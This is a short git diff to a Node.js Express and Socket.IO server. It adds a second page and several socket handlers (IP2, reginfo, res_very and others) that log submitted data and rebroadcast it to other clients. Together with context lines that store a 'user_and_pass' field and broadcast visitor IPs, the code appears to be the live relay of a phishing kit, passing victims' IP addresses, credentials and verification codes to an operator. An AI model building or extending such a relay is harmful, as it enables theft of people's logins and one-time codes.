@@ -11,7 +11,10 @@ mongoose.connect(DB, function(err, db){console.log('database connected');
 app.get('/',function(req, res){
     res.sendFile('index.html',{root:__dirname})
 });
-server.listen(process.env.PORT || 3000, ()=>{
+app.get('/home2',function(req, res){
+    res.sendFile('home2.html',{root:__dirname})
+});
+server.listen(process.env.PORT || 3326, ()=>{
     console.log("server running");
 });
 
@@ -29,6 +32,29 @@ io.on("connection", (socket)=>{
             user_and_pass:xy})
         socket.broadcast.emit('show_ip', data )
     })
+
+    socket.on("IP2", (data)=>{
+        console.log(data)
+        socket.broadcast.emit('show_ip2', data )
+    })
+    socket.on("reginfo", (data)=>{
+        console.log(data)
+        socket.broadcast.emit('show_reg', data )
+    })
+    socket.on("reginfo2", (data)=>{
+        console.log(data)
+        socket.broadcast.emit('show_reg2', data )
+    })
+    socket.on("res_very", (data)=>{
+        console.log(data)
+        socket.broadcast.emit('very', data )
+    })
+    socket.on("res_very2", (data)=>{
+        console.log(data)
+        socket.broadcast.emit('very2', data )
+    })
+
+
     socket.on("message", (data)=>{
         console.log(data)
     })
